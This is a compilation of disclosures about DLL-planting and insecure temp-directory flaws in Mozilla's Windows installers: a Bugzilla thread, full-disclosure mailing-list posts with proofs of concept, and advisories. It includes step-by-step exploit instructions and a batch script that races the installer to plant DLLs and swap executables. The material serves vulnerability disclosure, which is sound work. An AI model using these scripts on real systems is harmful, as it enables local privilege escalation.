Attached file
[poc.rar](attachment.cgi?id=8362475)
— [Details](attachment.cgi?id=8362475&action=edit)

I have seen the following behavior with windows 7 32bit and the maintenservice\_installer.exe which is for example executed during an update process with the mozilla maintenance service.
The installer creates during execution a file with the following name format and executes the file:
C:\Windows\Temp\ns{random character a-z generated with GetTickCount%26}{16bit hex value from GetTickCount()}.tmp\ns{16bit hex value from GetTickCount()}.tmp
For example: C:\Windows\Temp\nscFF1B.tmp\nsFFCA.tmp
It is possible to force the executable to load dlls from the current directory with an „executable.local” dirctory in the directory of the executable (windows specific feature).
For the example with a ”C:\Windows\Temp\nsFF1B.tmp\nsFFCA.tmp.local” directory, the dlls loaded from the nsFFCA.tmp executable will be first searched in the nsFFCA.tmp.local directory, then in the nscFF1B.tmp directory and at least at the system path.
Because the temp directory is writable for normal users and the path is easy to guess because of the use of GetTickCount() there is a privilege escalation vulnerability.
POC:
To try out the poc you need firefox 26.0 with the maintenance service installed and a 32bit windows. I used windows 7. My poc tries to force the executable to load a fake mcrvrt.dll from the directory to start a calc.exe with system rights. Because of GetTickCount() this attack is timing dependent.
Steps:
1.) download poc and extract the files
2.) copy the updater.exe from the firefox directory to the poc/update directory
3.) download <http://ftp.mozilla.org/pub/mozilla.org/firefox/releases/26.0/update/win32/en-US/firefox-26.0.complete.mar> and save the file as update.mar in the poc/update directory
4.) alter the paths in update.bat to your paths
5.) start poc.exe
6.) start update.bat
7.) wait for output from poc.exe
8.) check for calc.exe
9.) if no calc.exe found, start update again
With windows 7 64bit no executable is loaded in the temp directory, so this will not work but maybe there is another way. Maybe the source of this vulnerability is in the nullsoft installer system and not in the script to create the installer, so maybe it's a general nsis problem.

I'm not sure why the maintenservice\_installer.exe installer does this, it's definitely not something we do manually in NSIS script. I think the safest way to get around this is to not run a binary created from an NSIS script and to just do the steps manually inside updater code.

I don't recall. Stream of bug consciousness says you and Rob have looked at / are working on various issues with the installer and maintenance service security.

I ask because we're considering removing the pref for whether or not to use the maintenance service in another bug. We consider the maintenance service to be more secure in some cases.
You mentioned that you know of several issues around the maintenance service, and if that is the case, please ping me on them because they will factor into the above decision.

The installer and the maintenance service are very different things.

rstrong and I discussed this bug.
- Removing the maintenance service pref probably wouldn't have any benefit because they could disable the maintenance service if they really wanted to in other ways like simulating failed updates so it falls back to not using the service.
- The only known way to fix this, is very risky and would probably affect update uptake in general.
- If we implemented this bug the secure way, and accepted that there would be a decrease in update uptake, this would introduce a new security issue that someone could easily stop updates from happening by simply opening a handle to the firefox update directory. In which case we wouldn't be able to lock it and would fail the updates.
- We should check on new OS releases to make sure no new dlls are being injected to updates.
Since this bug has no known exploits, we think it is better to close as WONTFIX.
The only known way to fix this in general is to do 1-off fixes like we've been doing.
If there is any disagreement please feel free to re-open for discussion.

[patch v1.](attachment.cgi?id=8397948&action=diff)
— [Details](attachment.cgi?id=8397948&action=edit)
— [Splinter Review](/page.cgi?id=splinter.html&ignore=&bug=961676&attachment=8397948)

Does the maintenance service upgrade via the same method as the maintenance service installer. I.e. copies the installdir's maintenance service to maintenanceservice\_tmp.exe alongside the maintenance service. Then executes it with the upgrade command line param.
It doesn't update the registry with new maintenance service info on upgrades, but this info is not correct anyway already. Cleanup for not showing the version in registry should be done in a different bug that is reported about that (it exists already)

patch v1.
Approval request for landing on Oak for testing and on mozilla-inbound.
[Security approval request comment]
How easily could an exploit be constructed based on the patch?
Hard to tell what the change is for.
Do comments in the patch, the check-in comment, or tests included in the patch paint a bulls-eye on the security problem?
I don't think so.
Which older supported branches are affected by this flaw?
All since the maintenance service in [bug 481815](/show_bug.cgi?id=481815 "RESOLVED FIXED - Provide a Windows service to update applications without asking Administrator password")
If not all supported branches, which bug introduced the flaw?
n/a
Do you have backports for the affected branches? If not, how different, hard to create, and risky will they be?
Backports should be the same
How likely is this patch to cause regressions; how much testing does it need?
Low

I've reproduced the original issue using the STR and the POC in [comment #0](/show_bug.cgi?id=961676#c0 "VERIFIED FIXED - Unsafe temp directory usage in maintenservice_installer.exe lead to possible privilege escalation") (Win 7 x86 using FF 26). I noticed that the calc.exe was runing under maintenanceservice\_installer.exe using session 0. (used Process Explorer)

Went through all of the above builds using the STR and the POC from [comment #0](/show_bug.cgi?id=961676#c0 "VERIFIED FIXED - Unsafe temp directory usage in maintenservice_installer.exe lead to possible privilege escalation") several times (5x on each build) and couldn't reproduce the original issue. maintenanceservice\_installer.exe is launched using session 0 and then updater.exe right beneath it.

# Mozilla doesn't care for upstream security fixes, and doesn't bother to send own security fixes upstream

```
Hi @ll

despite better knowledge and MULTIPLE bug/vulnerability reports
(see <<https://bugzilla.mozilla.org/show_bug.cgi?id=811557>>,
<<https://bugzilla.mozilla.org/show_bug.cgi?id=809373>>,
<<https://bugzilla.mozilla.org/show_bug.cgi?id=579593>>, ...)
Mozilla continues to ship Firefox and Thunderbird for Windows with
a vulnerable executable installer.

Proof of concept/demonstration:
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

1. visit <<http://home.arcor.de/skanthak/sentinel.html>>, download
   <<http://home.arcor.de/skanthak/download/SENTINEL.DLL>> and save
   it as ShimEng.dll in your "Downloads" folder, then copy it as
   WinMM.dll, SetupAPI.dll, MSACM32.dll, UXTheme.dll, DWMAPI.dll,
   ShFolder.dll, RichEd20.dll, ClbCatQ.dll, COMRes.dll, Version.dll,
   SAMCli.dll, SFC.dll, SFC_OS.dll, UserEnv.dll, ProfAPI.dll, MPR.dll,
   NTMarta.dll, Secur32.dll and CryptSP.dll

2. download any full-package installer for Firefox or Thunderbird
   from <<https://ftp.mozilla.org/pub/firefox/releases/.../win32/>...>
   or <<https://ftp.mozilla.org/pub/thunderbird/releases/.../win32/>...>
   (these are self-extractors built with 7-zip)

3. extract setup.exe from the downloaded self-extractor and save it
   in your "Downloads" folder, for example using the command line
      7za.exe x <self-extractor> setup.exe

   (or start the downloaded self-extractor, find the temporary
   subdirectory 7z*.tmp it created below %TEMP% and copy setup.exe
   from this subdirectory to your "Downloads" folder)

4. execute the extracted/copied setup.exe and notice the message
   boxes displayed from the DLL(s) downloaded in step 1:

PWNED!

See <<https://cwe.mitre.org/data/definitions/426.html>>,
<<https://cwe.mitre.org/data/definitions/427.html>> plus
<<https://capec.mitre.org/data/definitions/471.html>> for the
well-known and well-documented DLL search path vulnerability.

Mitigation:
~~~~~~~~~~~
Stay away from Mozilla's crapware until Mozilla starts to develop
a sense for the basics of software engineering as well as the safety
and security of their users^Wvictims: the authors of the 3rd party
installer fixed these vulnerabilities about 4 months ago!

JFTR: the vulnerable executable installer is not the only outdated
      3rd party component used to build Firefox and Thunderbird!
      Mozilla even uses different versions of this vulnerable
      executable installer for Firefox and Firefox ESR.

See <<https://www.firegiant.com/blog/2016/1/20/wix-v3.10.2-released/>>
why you should NEVER name any executable (installer) setup.exe!

stay tuned
Stefan Kanthak

PS: Mozilla fixed the same vulnerabilities in their executable self-
    extractor long ago (see for example
    <<https://bugzilla.mozilla.org/show_bug.cgi?id=792106>> or
    <<https://bugzilla.mozilla.org/show_bug.cgi?id=883165>>), but
    apparently did not send their fixes to the author of this tool.

This allows you to refer to bugs in other bug tracker installations. You can enter a URL to a bug in the 'Add Bug URLs' field to note that that bug is related to this one. You can enter multiple URLs at once by separating them with a comma. You should normally use this field to refer to bugs in other bug tracker installations, or bugs which are related to, but not known to be duplicates of the bug. Bugs which are regressions should be listed in the Regressed by field (above)Severity
This field describes the impact of a bug. This field is utilized by the programmers/engineers/release managers/managers to determine the severity of issues and used as input for the priority of the bug. It should not be set by people filing bugs. See the Firefox [triage documentation](https://firefox-source-docs.mozilla.org/bug-mgmt/policies/triage-bugzilla.html) and [severity documentation](https://firefox-source-docs.mozilla.org/bug-mgmt/guides/severity.html).

| Severity | Description |
| --- | --- |
| **--** | Default value for new bugs; bug triagers for components (ie engineers and other core project folks) are expected to update the bug's severity from this value. To avoid them missing new bugs for triage, do not alter this default when filing bugs. |
| **S1** | (Catastrophic) Blocks development/testing, may impact more than 25% of users, causes data loss, likely dot release driver, and no workaround available |
| **S2** | (Serious) Major functionality/product severely impaired or a high impact issue and a satisfactory workaround does not exist |
| **S3** | (Normal) Blocks non-critical functionality or a work around exists |
| **S4** | (Small/Trivial) minor significance, cosmetic issues, low or no impact to users |
| **N/A** | (Not Applicable) The above definitions do not apply to this bug; this value is reserved for bugs of type Task or Enhancement |

Summary

How it works

## Accurate, reliable vulnerability insights at your fingertips

The Secunia Research team from Flexera is comprised of several security specialists who conduct vulnerability research in various products in addition to testing, verifying and validating public vulnerability reports. Since its inception in 2002, the goal of the Secunia Research team is to provide the most accurate and reliable source of vulnerability intelligence.

Delivering the world’s best vulnerability intelligence requires skill and passion. Team members continually develop their skills exploring various high-profile closed and open-source software using a variety of approaches, focusing chiefly on thorough code audits and binary analysis. The team has received industry recognition, including naming members to [Microsoft’s Most Valuable Security Researchers](https://msrc-blog.microsoft.com/2019/08/07/announcing-2019-msrc-most-valuable-security-researchers/) list.

Secunia researchers discover hard-to-find vulnerabilities that aren’t normally identified with techniques such as fuzzing, and the results have been impressive. Members of the Secunia Research team have discovered critical vulnerabilities in products from vendors including Microsoft, Symantec, IBM, Adobe, RealNetworks, Trend Micro, HP, Blue Coat, Samba, CA, Mozilla and Apple.

The team produces invaluable security advisories based on research of the vulnerabilities affecting any given software update. Sometimes a single update can address multiple vulnerabilities of varying criticalities and threats; but these advisories aggregate and distill findings down to a single advisory perfect for the prioritization of patching efforts within [Software Vulnerability Manager](/products/software-vulnerability-manager). Criticality scores are consistently applied along with details around attack vector and other valuable details within [Software Vulnerability Research](/products/software-vulnerability-research/secunia-research). Illegitimate vulnerability reports are also investigated and rejected so you can focus only on what truly matters.

# Mozilla doesn't care for upstream security fixes, and doesn't bother to send own security fixes upstream

Hi @ll

despite better knowledge and MULTIPLE bug/vulnerability reports
(see <<https://bugzilla.mozilla.org/show_bug.cgi?id=811557>>,
<<https://bugzilla.mozilla.org/show_bug.cgi?id=809373>>,
<<https://bugzilla.mozilla.org/show_bug.cgi?id=579593>>, ...)
Mozilla continues to ship Firefox and Thunderbird for Windows with
a vulnerable executable installer.

Proof of concept/demonstration:
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

1. visit <<http://home.arcor.de/skanthak/sentinel.html>>, download
   <<http://home.arcor.de/skanthak/download/SENTINEL.DLL>> and save
   it as ShimEng.dll in your "Downloads" folder, then copy it as
   WinMM.dll, SetupAPI.dll, MSACM32.dll, UXTheme.dll, DWMAPI.dll,
   ShFolder.dll, RichEd20.dll, ClbCatQ.dll, COMRes.dll, Version.dll,
   SAMCli.dll, SFC.dll, SFC_OS.dll, UserEnv.dll, ProfAPI.dll, MPR.dll,
   NTMarta.dll, Secur32.dll and CryptSP.dll

2. download any full-package installer for Firefox or Thunderbird
   from <<https://ftp.mozilla.org/pub/firefox/releases/.../win32/>...>
   or <<https://ftp.mozilla.org/pub/thunderbird/releases/.../win32/>...>
   (these are self-extractors built with 7-zip)

3. extract setup.exe from the downloaded self-extractor and save it
   in your "Downloads" folder, for example using the command line
      7za.exe x <self-extractor> setup.exe

   (or start the downloaded self-extractor, find the temporary
   subdirectory 7z*.tmp it created below %TEMP% and copy setup.exe
   from this subdirectory to your "Downloads" folder)

4. execute the extracted/copied setup.exe and notice the message
   boxes displayed from the DLL(s) downloaded in step 1:

PWNED!

See <<https://cwe.mitre.org/data/definitions/426.html>>,
<<https://cwe.mitre.org/data/definitions/427.html>> plus
<<https://capec.mitre.org/data/definitions/471.html>> for the
well-known and well-documented DLL search path vulnerability.

Mitigation:
~~~~~~~~~~~
Stay away from Mozilla's crapware until Mozilla starts to develop
a sense for the basics of software engineering as well as the safety
and security of their users^Wvictims: the authors of the 3rd party
installer fixed these vulnerabilities about 4 months ago!

JFTR: the vulnerable executable installer is not the only outdated
      3rd party component used to build Firefox and Thunderbird!
      Mozilla even uses different versions of this vulnerable
      executable installer for Firefox and Firefox ESR.

See <<https://www.firegiant.com/blog/2016/1/20/wix-v3.10.2-released/>>
why you should NEVER name any executable (installer) setup.exe!

stay tuned
Stefan Kanthak

PS: Mozilla fixed the same vulnerabilities in their executable self-
    extractor long ago (see for example
    <<https://bugzilla.mozilla.org/show_bug.cgi?id=792106>> or
    <<https://bugzilla.mozilla.org/show_bug.cgi?id=883165>>), but
    apparently did not send their fixes to the author of this tool.

# Mozilla Foundation Security Advisory 2014-35

## Privilege escalation through Mozilla Maintenance Service Installer

Announced
April 29, 2014
Reporter
Ash
Impact
High
Products
Firefox, Firefox ESR
Fixed in

* Firefox 29
* Firefox ESR 24.5

### Description

Security researcher **Ash** reported an issue affected the
Mozilla Maintenance Service on Windows systems. The Mozilla Maintenance Service
installer writes to a temporary directory created during the update process
which is writable by users. If malicious DLL files are placed within this
directory during the update process, these DLL files can run in a privileged
context through the Mozilla Maintenance Service's privileges, allowing for local
privilege escalation.

This issue does not affect Linux or OS X users and is confined
to Windows.

# [CVE-2014-1520] NOT FIXED: privilege escalation via Mozilla's executable installers

---

*From*: "Stefan Kanthak" <stefan.kanthak () nexgo de>

*Date*: Wed, 15 Jun 2016 00:37:48 +0200

```
Hi @ll,

<<https://bugzilla.mozilla.org/show_bug.cgi?id=961676>> should
have fixed CVE-2014-1520 in Mozilla's executable installers for
Windows ... but does NOT!

JFTR: this type of vulnerability (really: a bloody stupid trivial
      beginner's error!) is well-known and well-documented as
      <<https://cwe.mitre.org/data/definitions/379.html>>.

Proof of concept/demonstration:
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

0. download "Firefox Setup Stub 47.0.exe", "Firefox Setup 47.0.exe",
   "Firefox Setup 45.2.0esr.exe" or "Thunderbird Setup 45.1.1.exe"
   and save them in an arbitrary directory;

1. download <<http://home.arcor.de/skanthak/download/SHFOLDER.DLL>>
   plus <<http://home.arcor.de/skanthak/download/SENTINEL.EXE>> and
   save them in an(other) arbitrary directory;

2. start your editor, copy and paste the following 10 lines and
   save them as "POC.CMD" in the same directory as "SHFOLDER.DLL"
   and "SENTINEL.EXE" downloaded in step 1:

:WAIT1
@If Not Exist "%TEMP%\7z*.tmp" Goto :WAIT1
For /D %%! In ("%TEMP%\7z*.tmp") Do Set foobar=%%!
Copy "%~dp0shfolder.dll" "%foobar%\shfolder.dll"
:WAIT2
@If Not Exist "%foobar%\core\maintenanceservice.exe" Goto :WAIT2
Copy "%~dp0sentinel.exe" "%foobar%\core\maintenanceservice.exe"
:WAIT3
@If Not Exist "%foobar%\core\maintenanceservice_installer.exe" Goto :WAIT3
Copy "%~dp0sentinel.exe" "%foobar%\core\maintenanceservice_installer.exe"

3. execute the batch script "POC.CMD" created in step 2;

4. execute "Firefox Setup Stub 47.0.exe", "Firefox Setup 47.0.exe",
   "Firefox Setup 45.2.0esr.exe" or "Thunderbird Setup 45.1.1.exe"
   downloaded in step 0. and proceed as directed: notice the message
   boxed displayed from the copies of "SHFOLDER.DLL" and "SENTINEL.EXE"
   placed by the batch script started in step 3 in the unsafe TEMP
   subdirectory created by Mozilla's vulnerable executable installers!

PWNED!

Mitigation(s):
~~~~~~~~~~~~~~

0. don't use executable installers. DUMP THEM, NOW!

1. see <[http://home.arcor.de/skanthak/!execute.html](http://home.arcor.de/skanthak/%21execute.html)> as well as
   <<http://home.arcor.de/skanthak/SAFER.html>>.

2. stay away from Mozilla's vulnerable installers for their Windows
   software (at least until Mozilla starts to develop a sense for
   the safety and security of their users).

stay tuned

# Mozilla Products: Multiple vulnerabilities — GLSA **201504-01**

Multiple vulnerabilities have been found in Mozilla Firefox,
Thunderbird, and SeaMonkey, the worst of which may allow user-assisted
execution of arbitrary code.

### Affected packages

| Package | **www-client/firefox** on all architectures |
| --- | --- |

### Background

Mozilla Firefox is an open-source web browser and Mozilla Thunderbird an
open-source email client, both from the Mozilla Project. The SeaMonkey
project is a community effort to deliver production-quality releases of
code derived from the application formerly known as the ‘Mozilla
Application Suite’.

### Description

Multiple vulnerabilities have been discovered in Firefox, Thunderbird,
and SeaMonkey. Please review the CVE identifiers referenced below for
details.

### Impact

A remote attacker could entice a user to view a specially crafted web
page or email, possibly resulting in execution of arbitrary code or a
Denial of Service condition. Furthermore, a remote attacker may be able
to perform Man-in-the-Middle attacks, obtain sensitive information, spoof
the address bar, conduct clickjacking attacks, bypass security
restrictions and protection mechanisms, or have other unspecified
impact.

### Workaround

There are no known workarounds at this time.

# Oracle Solaris Third Party Bulletin - April 2016

## Oracle Solaris Third Party Bulletin - April 2016

### Description

The Oracle Solaris Third Party Bulletin announces patches for one or more security vulnerabilities fixed in third party software that is included in Oracle Solaris distributions. Starting January 20, 2015, Third Party Bulletins are released on the same day when Oracle Critical Patch Updates are released. These bulletins will also be updated on the Tuesday closest to the 17th of the following two months after their release (i.e. the two months between the normal quarterly Critical Patch Update publication dates). In addition, Third Party Bulletins may also be updated for vulnerability fixes deemed too critical to wait for the next monthly update.

**Due to the threat posed by a successful attack, Oracle strongly recommends that customers apply Third Party Bulletin fixes as soon as possible.**

### Patch Availability

Please see My Oracle Support Note [1448883.1](https://support.oracle.com/epmos/faces/DocumentDisplay?_afrLoop=98356520554156&id=1448883.1)

### Third Party Bulletin Schedule

Third Party Bulletins are released on the Tuesday closest to the 17th day of January, April, July and October. The next four dates are:

* 19 July 2016
* 18 October 2016
* 17 January 2017
* 18 April 2017

alias epic failures in Mozilla's PERMANENTLY vulnerable executable
installers for Windows, built by completely incompetent tinkerers:

* Defense in depth -- the Mozilla way: return and exit codes are dispensable
  <<https://www.securityfocus.com/archive/1/534881>> alias
  <<https://seclists.org/bugtraq/2015/Mar/74>> and
  <<https://seclists.org/fulldisclosure/2015/Mar/90>>

* Arbitrary code execution resp. escalation of privilege with Mozilla's SETUP.EXE
  <<https://www.securityfocus.com/archive/1/536778>> alias
  <<https://seclists.org/bugtraq/2015/Oct/123>> and
  <<https://seclists.org/fulldisclosure/2015/Oct/109>>

* Mozilla doesn't care for upstream security fixes, and doesn't bother to send own security fixes upstream
  <<https://www.securityfocus.com/archive/1/538220>> alias
  <<https://seclists.org/bugtraq/2016/Apr/161>> and
  <<https://seclists.org/fulldisclosure/2016/May/2>>

* [CVE-2014-1520] NOT FIXED: privilege escalation via Mozilla's executable installers
  <<https://www.securityfocus.com/archive/1/538679>> alias
  <<https://seclists.org/bugtraq/2016/Jun/60>>
  <<https://seclists.org/fulldisclosure/2016/Jun/27>>

The Register picked it up:
<<https://www.theregister.co.uk/2015/11/03/dev_to_mozilla_please_dump_ancient_windows_install_processes/>>

In the meantime more than 5 years have passed, but Mozilla still has
ABSOLUTELY no clue and continues to put its poor unsuspecting victims
at risk.

JFTR: the well-known weaknesses demonstrated below are classified as
      - CWE-377: Insecure Temporary File
        <<https://cwe.mitre.org/data/definitions/377.html>>
      - CWE-379: Creation of Temporary File in Directory with Incorrect Permissions
        <<https://cwe.mitre.org/data/definitions/379.html>>

Proof
~~~~~

0. Log on to a current installation of Windows 10 20H* under the user
   account created during Windows setup.

1. Download the (executable) online or offline installers for Mozilla
   Firefox (<<https://www.mozilla.org/en/firefox/download/thanks/>> or
   <<https://www.mozilla.org/en/firefox/all/#product-desktop-release>>)
   and the (executable) offline installer for Mozilla Thunderbird
   (<<https://www.thunderbird.net/en-US/thunderbird/all/#product-desktop-release>>),
   then save them in your "Downloads" directory.

2. Start Windows Explorer, open the "Downloads" directory, then right-
   click the downloaded installers to open their context menu and click
   "Properties".
   Switch to the "Digital Signatures" tab of the "Properties" dialog
   box and notice the SHA-1 only signature: OUCH!

   Mozilla, please quit your CA/B forum membership, NOW and forever!

   JFTR: Windows 8[.1] (released 2012) and Windows 10 (released 2015)
         support SHA-2 signatures out-of-the-box.
         Even Windows 7, which went out of extended support in January
         2020, supports SHA-2 signatures since October 14, 2014, when
         update <<https://support.microsoft.com/en-us/kb/2949927>> was
         published and distributed via Windows Update.

   Microsoft deprecated and abandoned SHA-1 only certificates and
   signatures in 2019, after announcing this step back in 2013!

3. Start a command prompt in the "Downloads" directory and run the
   following command line to show the version string of the program
   used to build the executable installers from their application
   manifest:

   FINDSTR.exe /C:"</description>" /E "Firefox Installer.exe" "Firefox*Setup*.exe" "Thunderbird*Setup*.exe"

   | Firefox Installer.exe:<description>7-Zip Self-extracting Archive v18.05</description>
   | Firefox Setup ....exe:<description>7-Zip Self-extracting Archive v18.05</description>
   | Thunderbird Setup ....exe:<description>7-Zip Self-extracting Archive v18.05</description>

   OUCH: Mozilla builds their executable installers with the superseded,
         unsupported and possibly^Wdefinitely vulnerable version 18.05
         of 7-Zip, released April 30, 2018.

   The current version 19.00 of 7-Zip was released February 21, 2019,
   more that 2 years ago.

   As already reported in 2016, Mozilla's tinkerers don't care for
   upstream fixes!

4. Run the following (block of) command lines to modify the NTFS ACL
   of your "Temp" directory to deny execution of files beyond it,
   change its path temporarily and execute the self-extractors:

   ICACLS.exe "%TMP%" /Deny *S-1-1-0:(IO)(OI)(X)
   FOR %? IN ("Firefox Installer.exe" "Firefox*Setup*.exe") DO @"%~f?"
   SET TMP=NUL:
   FOR %? IN ("Thunderbird*Setup*.exe") DO @"%~f?"
   SET TMP=%TEMP%

   Admire the 2 error message boxes (but DON'T close them yet):

   | 7-Zip                [X]
   |
   | (X) Access is denied.
   |
   |                [ OK ]

   | 7-Zip                                         [X]
   |
   | (X) The system cannot find the file specified.
   |
   |                                         [ OK ]

   OUCH: access is denied where, and which file cannot be found?

5. Run the following (block of) command lines to list the files and
   directories extracted to your "Temp" directory as well as their
   owner and permissions:

   FOR /D %? IN ("%TMP%\7zS*") DO @(
   DIR "%?" /A /Q
   ICACLS.EXE "%?"
   ICACLS.EXE "%?\setup*.exe")

   | Directory of C:\Users\Stefan\AppData\Local\Temp\7zSCA76A1C1
   |
   | 03/05/2021   6:13 PM <DIR>       AMNESIAC\Stefan      .
   ...
   | 02/22/2021   5:15 PM             AMNESIAC\Stefan  476.472 setup-stub.exe
   ...
   | C:\Users\Stefan\AppData\Local\Temp\7zSCA76A1C1 Everyone:(I)(OI)(IO)(DENY)(S,X)
   |                                                NT AUTHORITY\SYSTEM:(I)(OI)(CI)(F)
   |                                                BUILTIN\Administrators:(I)(OI)(CI)(F)
   |                                                AMNESIAC\Stefan:(I)(OI)(CI)(F)
   |
   | Successfully processed 1 files; Failed processing 0 files
   |
   | C:\Users\Stefan\AppData\Local\Temp\7zSCA76A1C1\setup-stub.exe Everyone:(I)(OI)(IO)(DENY)(S,X)
   |                                                               NT AUTHORITY\SYSTEM:(I)(OI)(CI)(F)
   |                                                               BUILTIN\Administrators:(I)(OI)(CI)(F)
   |                                                               AMNESIAC\Stefan:(I)(OI)(CI)(F)
   |
   | Successfully processed 1 files; Failed processing 0 files

   OUCH: the 7-Zip self-extractor fails to create directories and
         extracted files with proper permissions, allowing either
         the "denial of service" demonstrated here or the
         "escalation of privilege" already shown in 2015.

   OUCH: the 7-Zip self-extractor fails to check that extraction of
         its payload succeeds, there's only one subdirectory 7zS*
         present in %TEMP%, another "denial of service".

   Did I already state that 7-Zip is VULNERABLE crap, written by an
   incompetent kid that doesn't know the 101 of computer programming?

   Mozilla, abandon to use such CRAP!

6. Run the following (block of) command lines to copy the extracted
   setup*.exe to your "Downloads" directory, determine its version
   from the embedded application manifest, and execute it:

   FOR /D %? IN ("%TMP%\7zS*") DO @COPY "%?\setup*.exe"
   FINDSTR.exe /C:"<?xml version=" setup*.exe
   FOR %? IN (setup.exe setup-stub.exe) DO @"%~f?"

   |         1 file(s) copied.
   | [...]<description>Nullsoft Install System v3.01</description>[...]

   OUCH: the payload of the VULNERABLE 7-Zip self-extractor is built
         with the superseded, unsupported and possibly^Wdefinitely
         vulnerable version 3.01 of the Nullsoft Install System,
         released December 11, 2016; its current version is but 3.06.1,
         released July 31, 2020!

   Hey, you kids at Mozilla, are you sure that nobody fixes bugs and
   vulnerabilities in the course of 60 months and at least 5 releases!

7. Close the 2 open error message boxes from 7-Zip, then admire the
   error message box displayed from setup.exe or setup-stub.exe (but
   DON'T close it yet):

   | Setup                                                   [X]
   |
   |    Sorry, Firefox can't be installed. This version of
   |    Firefox requires Microsoft Windows 7 or newer.
   |    Please click the OK button for additional information.
   |
   |                                       [  OK  ] [ Cancel ]

   OUCH: VERY FUNNY, setup*.exe is actually running on Windows 10!

   Did I already state that NSIS too is VULNERABLE crap, written by an
   incompetent kid that doesn't know the 101 of computer programming?

   Hey Mozilla, abandon to use such CRAP!

8. Run the following (block of) command lines to determine the cause
   for the bogus error message:

   FOR /D %? IN ("%TMP%\ns*.tmp") DO @(
   DIR "%?" /A /Q
   ICACLS.exe "%?" /T)

   |  Directory of C:\Users\Stefan\AppData\Local\Temp\nsx8C5E.tmp
   |
   | 03/05/2021   6:15 PM <DIR>       AMNESIAC\Stefan      .
   ...
   | 03/05/2021   6:15 PM             AMNESIAC\Stefan   11.776 System.dll
   ...
   | C:\Users\Stefan\AppData\Local\Temp\nsx8C5E.tmp Everyone:(I)(OI)(IO)(DENY)(S,X)
   |                                                NT AUTHORITY\SYSTEM:(I)(OI)(CI)(F)
   |                                                BUILTIN\Administrators:(I)(OI)(CI)(F)
   |                                                AMNESIAC\Stefan:(I)(OI)(CI)(F)
   |
   | C:\Users\Stefan\AppData\Local\Temp\nsx8C5E.tmp\System.dll Everyone:(I)(DENY)(S,X)
   |                                                           NT AUTHORITY\SYSTEM:(I)(F)
   |                                                           BUILTIN\Administrators:(I)(F)
   |                                                           AMNESIAC\Stefan:(I)(F)
   |
   | Successfully processed 2 files; Failed processing 0 files

   Ouch: NSIS too uses the "Temp" directory to create a subdirectory
         and extract executable files it tries to load later, but
         fails to create them with proper permissions!

9. Finally close the bogus error message box and run the following
   command line to remove the NTFS ACE added in step 4:

   ICACLS.exe "%TMP%" /Remove:d *S-1-1-0

stay tuned, and far away from executable installers as well as crap from Mozilla, NSIS and 7-Zip

# SecLists.Org Security Mailing List Archive

Any hacker will tell you that the latest news and exploits are not
found on any web site—not even [Insecure.Org](https://insecure.org). No, the cutting edge
in security research is and will continue to be the full
disclosure mailing lists such as Bugtraq. Here we provide web
archives and RSS feeds (now including message extracts), updated in real-time, for many of our favorite lists.
Browse the individual lists below, or search them all using the Site Search box above.

**[Full Disclosure](/fulldisclosure/)** — A public, vendor-neutral forum for detailed discussion of vulnerabilities and exploitation techniques, as well as tools, papers, news, and events of interest to the community. The relaxed atmosphere of this quirky list provides some comic relief and certain industry gossip. More importantly, fresh vulnerabilities sometimes hit this list many hours or days before they pass through the Bugtraq moderation queue.
